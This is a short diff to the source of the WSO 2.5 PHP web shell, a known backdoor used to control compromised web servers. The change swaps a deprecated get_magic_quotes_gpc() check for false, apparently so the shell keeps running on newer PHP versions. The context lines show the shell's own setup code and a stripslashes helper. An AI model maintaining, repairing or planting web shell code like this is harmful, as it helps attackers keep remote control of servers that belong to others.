@@ -16,7 +16,7 @@ if (!empty($_SERVER['HTTP_USER_AGENT'])) {
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
 @define('WSO_VERSION', '2.5');
-if (get_magic_quotes_gpc()) {
+if (false) {
     function WSOstripslashes($array) {
         return is_array($array) ? array_map('WSOstripslashes', $array) : stripslashes($array);
     }
